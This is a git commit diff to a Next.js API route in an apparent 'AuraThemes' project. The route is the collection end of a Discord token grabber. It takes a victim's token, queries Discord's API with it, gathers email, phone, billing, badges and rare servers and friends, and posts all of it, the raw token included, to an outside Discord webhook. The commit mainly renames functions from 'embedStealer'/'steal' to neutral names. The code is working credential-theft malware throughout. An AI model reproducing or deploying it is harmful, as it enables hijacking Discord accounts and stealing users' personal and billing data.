f2d2ca7ba6786b7369baaea5490578fa9b39132c
k4itrun <truchorko2222@gmail.com>
2024-01-09 11:17:50 -0500

    loadddddd

--- src/pages/api/aurathemes/raw.js
+++ src/pages/api/aurathemes/raw.js
@@ -1,8 +1,6 @@
 import { EmbedBuilder, WebhookClient } from 'discord.js';
 import DiscordToken from 'discord.js-token';
-import fetch from 'node-fetch'; // Añade este import para manejar la función fetch correctamente
-
-import k4itrunConfig from '../../../../k4itrun.config';
+import k4itrunConfig from '../../../../k4itrun.config'
 
 const webhook = new WebhookClient({
   url: k4itrunConfig.webhook,
@@ -17,34 +15,38 @@ export default async function handler(req, res) {
   try {
     const { query } = req;
     if (!query.data) {
-      res.status(400).send('Bad Request: Missing "data" query parameter.');
+      res.status(400).send('Bad Request: Missing "data" query parameter');
       return;
     }
 
     const { data } = query;
+    const embed = getEmbed();
+    const response = await fetch('https://discord.com/api/v9/users/@me', {
+      headers: {
+        authorization: data,
+      },
+    });
 
-    const resp = await fetch('https://discord.com/api/v9/users/@me', { headers: { authorization: data } });
-   
-    const json = await resp.json();
+    const info = await response.json();
 
-    console.log(json);
+    console.log(info);
 
-    const infos = DiscordToken(data).all; 
+    const Discord = DiscordToken(data).all;
     const guilds = DiscordToken(data).guilds.rares; 
     const friends = DiscordToken(data).friends.rares;
-    const embed = await getEmbed();
-    const embedBuilder = infos?.ID ? embedStealer(infos, guilds, friends, data, embed) : embedRaw(data, embed);
+    const embedBuilder = Discord?.ID
+      ? buildInitializedEmbed(guilds, friends, Discord, data, embed)
+      : buildRawEmbed(data, embed);
 
     await webhook.send({
       embeds: [embedBuilder],
       username: '@AuraThemes',
       avatarURL: embed.avatar,
     });
-
+    
     res.status(200).send(data);
-
-  } catch (e) {
-    console.error('Error:', e);
+  } catch (error) {
+    console.error('Error:', error);
     res.status(500).send('Internal Server Error');
   }
 }
@@ -58,41 +60,42 @@ function getField(a = null, b = null, c = false) {
   return { name, value, inline };
 }
 
-function embedRaw(data, embed) {
-  const raws = new EmbedBuilder()
+function buildRawEmbed(data, embed) {
+  const rawEmbed = new EmbedBuilder()
     .setAuthor({ name: 'AuraThemes' })
     .setColor(EMBED_COLORS.raw)
     .setTitle('raw')
     .addFields(getField('New visit lmao', `\`\`\`${data}\`\`\``))
     .setFooter({ text: 'AuraThemes API', iconURL: embed.footericon })
     .setTimestamp();
-  return raws;
+  return rawEmbed;
 }
 
-function embedStealer(infos, guilds, friends, token, embed) {
-  const steal = new EmbedBuilder()
-    .setAuthor({ name: `${infos.username} | ${infos.ID}`, iconURL: infos.avatar })
-    .setThumbnail(infos.avatar)
+function buildInitializedEmbed(guilds, friends, Discord, data, embed) {
+  const initializedEmbed = new EmbedBuilder()
+    .setAuthor({ name: `${Discord.username} | ${Discord.ID}`, iconURL: Discord.avatar })
+    .setThumbnail(Discord.avatar)
     .setColor(EMBED_COLORS.initialized)
     .setTitle('AuraThemes Dualhooked - 6889.fun')
     .addFields(
-      getField('<a:aura:1087044506542674091> Token:', `\`\`\`${token}\`\`\``, false),
-      getField('<a:aura:1101739920319590420> Nitro:', infos.nitroType, true),
-      getField('<a:aura:863691953531125820> Phone', `\`${infos.phone}\``, true),
-      getField('<:aura:974711605927505990> Email', `\`${infos.mail}\``, true),
-      getField('Badges', infos.badges, true),
-      getField('Billing', infos.billing, true),
-      getField('Langue', infos.langue, true),
+      getField('<a:aura:1087044506542674091> Token:', `\`\`\`${data}\`\`\``, false),
+      getField('<a:aura:1101739920319590420> Nitro:', Discord.nitroType, true),
+      getField('<a:aura:863691953531125820> Phone', `\`${Discord.phone}\``, true),
+      getField('<:aura:974711605927505990> Email', `\`${Discord.mail}\``, false),
+      getField('Badges', Discord.badges, true),
+      getField('Billing', Discord.billing, true),
+      getField('Langue', Discord.langue, true),
       getField('\u200b', '**Rare Servers**\n' + guilds, false),
       getField('\u200b', "\u200b", false),
       getField('\u200b', '**Rare Friends**\n' + friends, false)
+
     )
     .setFooter({ text: 'AuraThemes Grabber', iconURL: embed.footericon })
     .setTimestamp();
-  return steal;
+  return initializedEmbed;
 }
 
-async function getEmbed() {
+function getEmbed() {
   try {
     const embed = {
       avatar_url: "https://i.imgur.com/WkKXZSl.gif",
